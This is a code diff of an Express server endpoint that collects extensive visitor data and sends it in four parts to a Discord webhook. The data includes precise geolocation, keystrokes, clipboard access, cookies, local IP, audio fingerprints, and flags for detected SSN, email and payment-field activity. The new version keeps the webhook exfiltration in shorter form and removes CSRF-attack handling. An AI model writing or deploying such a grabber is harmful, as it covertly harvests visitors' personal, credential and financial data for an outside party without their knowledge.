-      { name: 'Device Location', value: visitorInfo.location !== 'Unknown' ? `(${visitorInfo.location.latitude}, ${visitorInfo.location.longitude}, Accuracy: ${visitorInfo.location.accuracy}m)` : visitorInfo.location, inline: true },
-      { name: 'ISP', value: visitorInfo.isp, inline: true },
-      { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true },
-      { name: 'Proxy', value: visitorInfo.proxy ? 'Yes' : 'No', inline: true },
-      { name: 'Hosting', value: visitorInfo.hosting ? 'Yes' : 'No', inline: true },
-      { name: 'Browser', value: visitorInfo.browser, inline: true },
-      { name: 'OS', value: visitorInfo.os, inline: true },
-      { name: 'Device Type', value: visitorInfo.deviceType, inline: true },
-      { name: 'Screen Size', value: visitorInfo.screenSize, inline: true },
-      { name: 'Timezone', value: visitorInfo.timezone, inline: true },
-      { name: 'Language', value: visitorInfo.language, inline: true },
-      { name: 'Accept Language', value: visitorInfo.acceptLanguage, inline: true },
-      { name: 'Touch Support', value: visitorInfo.touchSupport, inline: true },
-      { name: 'Battery Status', value: visitorInfo.batteryStatus, inline: true },
-      { name: 'Color Depth', value: visitorInfo.colorDepth, inline: true },
-      { name: 'Hardware Concurrency', value: visitorInfo.hardwareConcurrency, inline: true },
-      { name: 'Device Memory', value: visitorInfo.deviceMemory, inline: true },
-      { name: 'Do Not Track', value: visitorInfo.doNotTrack, inline: true },
-      { name: 'Connection', value: visitorInfo.connection, inline: true },
-      { name: 'Scroll Position', value: visitorInfo.scrollPosition, inline: true },
-      { name: 'Cookies (Server)', value: visitorInfo.cookies, inline: true },
-      { name: 'Keystrokes', value: visitorInfo.part3.keystrokes, inline: true },
-      { name: 'Mouse Frequency', value: visitorInfo.part3.mouseMovementFrequency, inline: true },
-      { name: 'WebGL Support', value: visitorInfo.part3.webglSupport, inline: true },
-      { name: 'Connection Type', value: visitorInfo.part3.connectionType, inline: true },
-      { name: 'Clipboard Access', value: visitorInfo.part3.clipboardAccess, inline: true },
-      { name: 'Device Orientation', value: visitorInfo.part3.deviceOrientationSupport, inline: true },
-      { name: 'Session Storage', value: visitorInfo.part3.sessionStorageUsage, inline: true },
-      { name: 'Browser Features', value: visitorInfo.part3.browserFeatures, inline: true },
-      { name: 'Page Load Time', value: visitorInfo.part3.pageLoadTime, inline: true },
-      { name: 'Interaction Count', value: visitorInfo.part3.userInteractionCount.toString(), inline: true },
-      { name: 'SSN Pattern', value: visitorInfo.part3.ssnPatternDetected, inline: true },
-      { name: 'Email Pattern', value: visitorInfo.part3.emailPatternDetected, inline: true },
-      { name: 'Payment Interaction', value: visitorInfo.part3.paymentFieldInteraction, inline: true },
-      { name: 'UTM Parameters', value: visitorInfo.part3.utmParameters, inline: true },
-      { name: 'Clicked Elements', value: visitorInfo.part3.clickedElements, inline: true },
-      { name: 'Session Duration', value: visitorInfo.part3.sessionDuration, inline: true },
-      { name: 'Event Log', value: visitorInfo.part3.eventLog, inline: true },
-      { name: 'Client Cookies', value: visitorInfo.part4.clientCookies, inline: true },
-      { name: 'Local Storage Usage', value: visitorInfo.part4.localStorageUsage, inline: true },
-      { name: 'Local IP', value: visitorInfo.part4.localIP, inline: true },
-      { name: 'Audio Fingerprint', value: visitorInfo.part4.audioFingerprint, inline: true },
-      { name: 'Threats', value: threats.length ? threats.map(t => `**${t.type}**: ${t.details}`).join('\n') : 'None', inline: false }
-    ];
+  await fetch(hook, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(pay2)
+  }).then(resp => {
+    if (!resp.ok) logger.error('part2 send fail');
+    else logger.info('part2 sent');
+  });
 
-    const part1 = fields.slice(0, 18);
-    const part2 = fields.slice(18, 33);
-    const part3 = fields.slice(33, 48);
-    const part4 = fields.slice(48);
+  await new Promise(r => setTimeout(r, 2000));
 
-    const totalThreats = threats.length;
+  await fetch(hook, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(pay3)
+  }).then(resp => {
+    if (!resp.ok) logger.error('part3 send fail');
+    else logger.info('part3 sent');
+  });
 
-    const payload1 = {
-      embeds: [{
-        title: 'New Visitor Detected! (Part 1 - Critical Info)',
-        color: getColor(threatsByPart.part1, totalThreats),
-        timestamp: visitorInfo.timestamp,
-        fields: part1
-      }]
-    };
+  await new Promise(r => setTimeout(r, 2000));
 
-    const payload2 = {
-      embeds: [{
-        title: 'New Visitor Detected! (Part 2 - Device Details)',
-        color: getColor(threatsByPart.part2, totalThreats),
-        timestamp: visitorInfo.timestamp,
-        fields: part2
-      }]
-    };
+  await fetch(hook, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(pay4)
+  }).then(resp => {
+    if (!resp.ok) logger.error('part4 send fail');
+    else logger.info('part4 sent');
+  });
 
-    const payload3 = {
-      embeds: [{
-        title: 'New Visitor Detected! (Part 3 - Interactions)',
-        color: getColor(threatsByPart.part3, totalThreats),
-        timestamp: visitorInfo.timestamp,
-        fields: part3
-      }]
-    };
-
-    const payload4 = {
-      embeds: [{
-        title: 'New Visitor Detected! (Part 4 - Fingerprints & Threats)',
-        color: getColor(threatsByPart.part4, totalThreats),
-        timestamp: visitorInfo.timestamp,
-        fields: part4
-      }]
-    };
-
-    try {
-      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-      const logDir = path.join(__dirname, 'logs');
-      await fs.mkdir(logDir, { recursive: true });
-
-      const logFile1 = path.join(logDir, `webhook_payload_1_${timestamp}.txt`);
-      await fs.writeFile(logFile1, JSON.stringify(payload1, null, 2));
-      logger.info('Saved webhook payload 1 to file', { file: logFile1, payloadSize: JSON.stringify(payload1).length });
-
-      const logFile2 = path.join(logDir, `webhook_payload_2_${timestamp}.txt`);
-      await fs.writeFile(logFile2, JSON.stringify(payload2, null, 2));
-      logger.info('Saved webhook payload 2 to file', { file: logFile2, payloadSize: JSON.stringify(payload2).length });
-
-      const logFile3 = path.join(logDir, `webhook_payload_3_${timestamp}.txt`);
-      await fs.writeFile(logFile3, JSON.stringify(payload3, null, 2));
-      logger.info('Saved webhook payload 3 to file', { file: logFile3, payloadSize: JSON.stringify(payload3).length });
-
-      const logFile4 = path.join(logDir, `webhook_payload_4_${timestamp}.txt`);
-      await fs.writeFile(logFile4, JSON.stringify(payload4, null, 2));
-      logger.info('Saved webhook payload 4 to file', { file: logFile4, payloadSize: JSON.stringify(payload4).length });
-
-      logger.info('Attempting to send to Discord Webhook (Part 1)', { webhookURL, payloadSize: JSON.stringify(payload1).length });
-      const webhookResponse1 = await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload1)
-      });
-
-      if (!webhookResponse1.ok) {
-        const text = await webhookResponse1.text();
-        logger.error('Failed to send to Discord Webhook (Part 1)', {
-          status: webhookResponse1.status,
-          statusText: webhookResponse1.statusText,
-          response: text,
-          webhookURL
-        });
-        return res.status(500).send('Failed to send visitor info to Discord (Part 1)');
-      }
-
-      logger.info('Successfully sent to Discord Webhook (Part 1)', { status: webhookResponse1.status, webhookURL });
-
-      await new Promise(resolve => setTimeout(resolve, 2000));
-
-      logger.info('Attempting to send to Discord Webhook (Part 2)', { webhookURL, payloadSize: JSON.stringify(payload2).length });
-      const webhookResponse2 = await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload2)
-      });
-
-      if (!webhookResponse2.ok) {
-        const text = await webhookResponse2.text();
-        logger.error('Failed to send to Discord Webhook (Part 2)', {
-          status: webhookResponse2.status,
-          statusText: webhookResponse2.statusText,
-          response: text,
-          webhookURL
-        });
-        return res.status(500).send('Failed to send visitor info to Discord (Part 2)');
-      }
-
-      logger.info('Successfully sent to Discord Webhook (Part 2)', { status: webhookResponse2.status, webhookURL });
-
-      await new Promise(resolve => setTimeout(resolve, 2000));
-
-      logger.info('Attempting to send to Discord Webhook (Part 3)', { webhookURL, payloadSize: JSON.stringify(payload3).length });
-      const webhookResponse3 = await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload3)
-      });
-
-      if (!webhookResponse3.ok) {
-        const text = await webhookResponse3.text();
-        logger.error('Failed to send to Discord Webhook (Part 3)', {
-          status: webhookResponse3.status,
-          statusText: webhookResponse3.statusText,
-          response: text,
-          webhookURL
-        });
-        return res.status(500).send('Failed to send visitor info to Discord (Part 3)');
-      }
-
-      logger.info('Successfully sent to Discord Webhook (Part 3)', { status: webhookResponse3.status, webhookURL });
-
-      await new Promise(resolve => setTimeout(resolve, 2000));
-
-      logger.info('Attempting to send to Discord Webhook (Part 4)', { webhookURL, payloadSize: JSON.stringify(payload4).length });
-      const webhookResponse4 = await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload4)
-      });
-
-      if (!webhookResponse4.ok) {
-        const text = await webhookResponse4.text();
-        logger.error('Failed to send to Discord Webhook (Part 4)', {
-          status: webhookResponse4.status,
-          statusText: webhookResponse4.statusText,
-          response: text,
-          webhookURL
-        });
-        return res.status(500).send('Failed to send visitor info to Discord (Part 4)');
-      }
-
-      logger.info('Successfully sent to Discord Webhook (Part 4)', { status: webhookResponse4.status, webhookURL });
-
-    } catch (error) {
-      logger.error('Error sending to Discord Webhook', { error: error.message, stack: error.stack, webhookURL });
-      return res.status(500).send('Error sending visitor info to Discord');
-    }
-
-    res.status(200).send('Visitor info recorded');
-  } catch (error) {
-    logger.error('Error in /api/visit', { error: error.message, stack: error.stack, body: req.body });
-    res.status(500).send('Server error');
+  res.status(200).send('got it');
+  } catch (err) {
+    logger.error('visit error', { msg: err.message, stk: err.stack, bod: req.body });
+    res.status(500).send('oops');
   }
 });
 
+// log incoming
 app.use((req, res, next) => {
-  logger.info('Incoming Request', {
-    method: req.method,
-    path: req.originalUrl,
-    ip: getClientIP(req).primary,
-    timestamp: new Date().toISOString()
+  logger.info('req in', {
+    meth: req.method,
+    pth: req.originalUrl,
+    ip: pullClientIp(req).primary,
+    ts: new Date().toISOString()
   });
   next();
 });
 
+// error catcher
 app.use((err, req, res, next) => {
-  logger.error('Unhandled error', { error: err.message, stack: err.stack });
-  if (err.code === 'EBADCSRFTOKEN') {
-    logger.warn('CSRF Attack Detected', {
-      ip: getClientIP(req).primary,
-      path: req.originalUrl,
-      cookies: req.cookies,
-      headers: req.headers
-    });
-    res.status(403).send('Invalid CSRF token');
-  } else {
-    res.status(500).send('Something broke!');
-  }
+  logger.error('error', { msg: err.message, stk: err.stack });
+  res.status(500).send('broke');
 });
 
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));
+const port = process.env.PORT || 10000;
+app.listen(port, () => logger.info(`up on ${port}`));
